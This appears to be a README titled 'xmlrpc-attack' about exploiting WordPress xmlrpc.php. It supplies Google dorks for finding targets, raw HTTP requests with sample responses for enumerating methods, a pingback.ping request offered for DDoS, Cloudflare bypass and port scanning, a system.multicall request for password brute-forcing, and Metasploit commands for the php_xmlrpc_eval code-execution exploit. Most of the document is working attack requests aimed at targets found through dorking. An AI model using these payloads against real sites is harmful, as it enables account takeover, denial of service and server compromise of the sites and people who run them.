# xmlrpc-attack
Exploiting the xmlrpc.php 
<br><br>

## Dorks for finding potential targets
- inurl:"/xmlrpc.php?rsd"
- intitle:"WordPress" inurl:"readme.html"
- allinurl:"wp-content/plugins/"

## Searching for XML-RPC servers on WordPress :
- Post Method :
  
  ```
  POST /xmlrpc.php HTTP/1.1
  Host: example.com
  Content-Length: 135

  <?xml version="1.0" encoding="utf-8"?>
  <methodCall>
  <methodName>system.listMethods</methodName>
  <params></params>
  </methodCall>
  ```

- The normal response should be :

  ```
    HTTP/1.1 200 OK
    Date: Mon, 01 Jul 2019 17:13:30 GMT
    Server: Apache
    Strict-Transport-Security: max-age=63072000; includeSubdomains; preload
    Connection: close
    Vary: Accept-Encoding
    Referrer-Policy: no-referrer-when-downgrade
    Content-Length: 4272
    Content-Type: text/xml; charset=UTF-8
    
    <?xml version="1.0" encoding="UTF-8"?>
    <methodResponse>
      <params>
      <param>
        <value>
      <array><data>
    <value><string>system.multicall</string></value>
    <value><string>system.listMethods</string></value>
    <value><string>system.getCapabilities</string></value>
    <value><string>demo.addTwoNumbers</string></value>
    <value><string>demo.sayHello</string></value>
    <value><string>pingback.extensions.getPingbacks</string></value>
    <value><string>pingback.ping</string></value>
    <value><string>mt.publishPost</string></value>
    ...
    <value><string>wp.getUsersBlogs</string></value>
    </data></array>
        </value>
      </param>
    </params>
    </methodResponse>

  ```

## XML-RPC pingbacks attacks
1. Distributed denial-of-service (DDoS) attacks<br>
1. Cloudflare Protection Bypass (find real server ip)<br>
1. XSPA (Cross Site Port Attack)<br>

```
POST /xmlrpc.php HTTP/1.1
Host: example.com
Content-Length: 303

<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value><string>https://postb.in/1562017983221-4377199190203</string></value>
</param>
<param>
<value><string>https://example.com/</string></value>
</param>
</params>
</methodCall>
```

response :
```
HTTP/1.1 200 OK
Date: Mon, 01 Jul 2019 21:53:56 GMT
Server: Apache
Strict-Transport-Security: max-age=63072000; includeSubdomains; preload
Connection: close
Vary: Accept-Encoding
Referrer-Policy: no-referrer-when-downgrade
Content-Length: 370
Content-Type: text/xml; charset=UTF-8

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <fault>
    <value>
      <struct>
        <member>
          <name>faultCode</name>
          <value><int>0</int></value>
        </member>
        <member>
          <name>faultString</name>
          <value><string></string></value>
        </member>
      </struct>
    </value>
  </fault>
</methodResponse>
```

## Brute force attacks
```
POST /xmlrpc.php HTTP/1.1
Host: example.com
Content-Length: 1560

<?xml version="1.0"?>
<methodCall><methodName>system.multicall</methodName><params><param><value><array><data>

<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>\{\{ Your Username \}\}</string></value><value><string>\{\{ Your Password \}\}</string></value></data></array></value></data></array></value></member></struct></value>

<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>\{\{ Your Username \}\}</string></value><value><string>\{\{ Your Password \}\}</string></value></data></array></value></data></array></value></member></struct></value>

<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>\{\{ Your Username \}\}</string></value><value><string>\{\{ Your Password \}\}</string></value></data></array></value></data></array></value></member></struct></value>

<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>\{\{ Your Username \}\}</string></value><value><string>\{\{ Your Password \}\}</string></value></data></array></value></data></array></value></member></struct></value>

</data></array></value></param></params></methodCall>
```

response :
```
HTTP/1.1 200 OK
Date: Mon, 01 Jul 2019 23:02:55 GMT
Server: Apache
Strict-Transport-Security: max-age=63072000; includeSubdomains; preload
Connection: close
Vary: Accept-Encoding
Referrer-Policy: no-referrer-when-downgrade
Content-Length: 1043
Content-Type: text/xml; charset=UTF-8

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <array><data>
  <value><struct>
  <member><name>faultCode</name><value><int>403</int></value></member>
  <member><name>faultString</name><value><string>Incorrect username or password.</string></value></member>
</struct></value>
  <value><struct>
  <member><name>faultCode</name><value><int>403</int></value></member>
  <member><name>faultString</name><value><string>Incorrect username or password.</string></value></member>
</struct></value>
  <value><struct>
  <member><name>faultCode</name><value><int>403</int></value></member>
  <member><name>faultString</name><value><string>Incorrect username or password.</string></value></member>
</struct></value>
  <value><struct>
  <member><name>faultCode</name><value><int>403</int></value></member>
  <member><name>faultString</name><value><string>Incorrect username or password.</string></value></member>
</struct></value>
</data></array>
      </value>
    </param>
  </params>
</methodResponse>
```
<br><br>
## PHP XML-RPC Arbitrary Code Execution
This exploits an arbitrary code execution flaw discovered in many implementations of the PHP XML-RPC module. This flaw is exploitable through a number of PHP web applications, including but not limited to Drupal, Wordpress, Postnuke, and TikiWiki.
<br><br>
To display the available options, load the module within the Metasploit console and run the commands 'show options' or 'show advanced' :

```
msf > use exploit/unix/webapp/php_xmlrpc_eval
msf exploit(php_xmlrpc_eval) > show targets
    ...targets...
msf exploit(php_xmlrpc_eval) > set TARGET < target-id >
msf exploit(php_xmlrpc_eval) > show options
    ...show and set options...
msf exploit(php_xmlrpc_eval) > exploit
```

